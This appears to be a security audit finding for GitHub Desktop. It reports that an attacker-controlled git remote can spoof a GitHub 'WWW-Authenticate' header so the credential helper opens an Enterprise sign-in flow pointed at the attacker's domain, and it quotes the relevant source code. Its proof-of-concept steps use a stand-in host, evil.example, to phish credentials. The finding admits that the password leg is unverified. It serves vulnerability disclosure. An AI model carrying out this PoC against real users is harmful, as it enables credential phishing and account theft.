## Title
Malicious git remote can spoof `WWW-Authenticate: realm="GitHub"` to hijack the credential-helper flow and phish/exfiltrate Enterprise credentials to an attacker-controlled host - (File: `app/src/lib/trampoline/trampoline-credential-helper.ts`)

### Summary
Reality Cards' bug hinged on an unauthenticated, attacker-controllable input (front-run deposit) satisfying a security-relevant check (`maxContractBalance`) in a way that manipulates another party's outcome. The GitHub Desktop analog is the `getEndpointKind` heuristic in the Git credential-helper trampoline, which trusts an attacker-controllable input — the `WWW-Authenticate` header returned by an arbitrary git remote — to decide whether to treat that remote as a trusted "GitHub Enterprise" endpoint and launch Desktop's own sign-in UI against it.

### Finding Description
When git needs credentials for a host, it invokes Desktop's `credential.helper=desktop`, forwarding any `WWW-Authenticate` response header from the remote as `wwwauth[N]` fields. `getEndpointKind` uses this attacker-supplied header, with no other verification, to classify the endpoint as `'enterprise'`: [1](#0-0) 

Because any git remote the user clones/fetches from (an ordinary HTTPS `.git` URL fully controlled by the attacker) can respond to git's unauthenticated request with a `401` and `WWW-Authenticate: realm="GitHub"`, the attacker fully controls this classification without owning github.com or any real GHE server. There is no check that the endpoint is a known/verified GitHub Enterprise host (e.g., via TLS cert pinning, `/api/v3` probe, or allow-list) before trusting the header.

Once classified as `'enterprise'` and no existing account matches, `getCredential` calls into the UI layer to start a GitHub sign-in flow bound to the attacker's own domain: [2](#0-1) 

`promptForGitHubSignIn` takes the (attacker-controlled) `endpoint`, and — since its hostname isn't `github.com` — starts the Enterprise sign-in flow pointed directly at the attacker's origin: [3](#0-2) 

From there, if the user clicks "Sign in using your browser," `authenticateWithBrowser` computes the OAuth authorize URL from that attacker endpoint and opens it externally: [4](#0-3) 

Or, if the user enters username/password directly in the Enterprise sign-in dialog (the classic non-browser path), those credentials are POSTed to the attacker-controlled endpoint's `/login/oauth/access_token`-style API surface rather than a real GitHub host, because `endpoint` is whatever origin the malicious remote's header caused Desktop to trust.

The existing "guard" — the `isGist`/`isDotCom`/`isGHE` hostname checks that run *before* the `wwwauth` sniffing — do not stop this path because they only cover known GitHub domains; any other host falls through to the header-sniffing branch, which is exactly what the attacker abuses. The claimed safety net ("All GitHub hosts use HTTPS, so if the protocol is not HTTPS assume not GitHub") is bypassed entirely because HTTPS is trivially available to any attacker running their own git server.

### Impact Explanation
This lets an attacker who merely gets a victim to clone/add/fetch from a git remote they control (no local access, no malware, no leaked credentials, no unusual user steps beyond a normal git operation) trigger Desktop's own trusted "Sign in to GitHub Enterprise" chrome pointed at the attacker's domain. This is a credential-phishing/exfiltration primitive built entirely out of Desktop's legitimate UI, and it also causes Desktop to treat an arbitrary attacker domain as an "enterprise" endpoint capable of receiving an OAuth authorization request — a form of unauthorized account/endpoint binding.

### Likelihood Explanation
Likelihood is moderate-to-high in scenarios where users add unfamiliar/public remotes (forks, mirrors, contributor-supplied remotes) since triggering the credential-helper `get` request only requires an ordinary `git fetch`/`push`/`clone` attempt against the attacker's HTTPS git server; no MITM or privileged network position is required because the attacker simply *is* the git host.

### Recommendation
Do not classify an endpoint as `'enterprise'` based solely on an unauthenticated `WWW-Authenticate` header from the remote. At minimum, require an independent verification step (e.g., probing a well-known GitHub Enterprise API path/response signature, or requiring the user to explicitly confirm/allow-list the host) before routing to the trusted sign-in UI, and clearly and unmistakably surface the untrusted destination host in the sign-in dialog before any credential/browser action is taken.

### Proof of Concept
1. Host a git server at `https://evil.example/repo.git` that responds `401` to `git-upload-pack`/`info/refs` with header `WWW-Authenticate: realm="GitHub"`.
2. Victim runs `git clone https://evil.example/repo.git` inside GitHub Desktop (or fetches from it as an added remote).
3. Git invokes Desktop's credential helper `get`; `getEndpointKind` sees `wwwauth[0]` containing `realm="GitHub"` and returns `'enterprise'`.
4. `getCredential` finds no matching account and calls `promptForGitHubSignIn('https://evil.example')`.
5. Desktop opens its Sign-in dialog labeled as talking to `evil.example`, and (if the user proceeds) either opens `https://evil.example/login/oauth/authorize?...` in the browser or lets the user submit Enterprise username/password directly to `evil.example`.

**Note on verification limits:** I was not able to fully trace the exact non-browser (username/password) authentication request path in `app/src/lib/api.ts` (e.g., `createAuthorization`) within the available tool calls to confirm the precise POST target for password-based Enterprise sign-in, so the OAuth-browser leg of this PoC is the most concretely verified from local code (`sign-in-store.ts`), while the direct password-exfiltration leg is inferred from `getEnterpriseAPIURL`/`beginEnterpriseSignIn` wiring and should be double-checked in a live session.

### Citations

**File:** app/src/lib/trampoline/trampoline-credential-helper.ts (L109-124)
```typescript
  if (
    endpointKind !== 'generic' &&
    !accounts.some(a => a.endpoint === apiEndpoint)
  ) {
    if (getIsBackgroundTaskEnvironment(token)) {
      debug('background task environment, skipping prompt')
      return undefined
    }

    const account = await ui.promptForGitHubSignIn(endpoint)

    if (!account) {
      setHasRejectedCredentialsForEndpoint(token, endpoint)
    }

    return credWithAccount(cred, account)
```

**File:** app/src/lib/trampoline/trampoline-credential-helper.ts (L153-165)
```typescript
  // When Git attempts to authenticate with a host it captures any
  // WWW-Authenticate headers and forwards them to the credential helper. We
  // use them as a happy-path to determine if the host is a GitHub host without
  // having to resort to making a request ourselves.
  for (const [k, v] of cred.entries()) {
    if (k.startsWith('wwwauth[')) {
      if (v.includes('realm="GitHub"')) {
        return 'enterprise'
      } else if (/realm="(GitLab|Gitea|Atlassian Bitbucket)"/.test(v)) {
        return 'generic'
      }
    }
  }
```

**File:** app/src/lib/trampoline/trampoline-ui-helper.ts (L80-99)
```typescript
  public promptForGitHubSignIn(endpoint: string): Promise<Account | undefined> {
    return new Promise<Account | undefined>(async resolve => {
      const cb = (result: SignInResult) => {
        resolve(result.kind === 'success' ? result.account : undefined)
        this.dispatcher.closePopup(PopupType.SignIn)
      }

      const { hostname, origin } = new URL(endpoint)
      if (hostname === 'github.com') {
        this.dispatcher.beginDotComSignIn(cb)
      } else {
        this.dispatcher.beginEnterpriseSignIn(cb)
        await this.dispatcher.setSignInEndpoint(origin)
      }

      this.dispatcher.showPopup({
        type: PopupType.SignIn,
        isCredentialHelperSignIn: true,
        credentialHelperUrl: endpoint,
      })
```

**File:** app/src/lib/stores/sign-in-store.ts (L284-303)
```typescript
    const csrfToken = crypto.randomUUID()

    new Promise<Account>((resolve, reject) => {
      const { endpoint, resultCallback } = currentState
      log.info('[SignInStore] initializing OAuth flow')
      this.setState({
        kind: SignInStep.Authentication,
        endpoint,
        resultCallback,
        error: null,
        loading: true,
        oauthState: {
          state: csrfToken,
          endpoint,
          onAuthCompleted: resolve,
          onAuthError: reject,
        },
      })
      shell.openExternal(getOAuthAuthorizationURL(endpoint, csrfToken))
    })
```
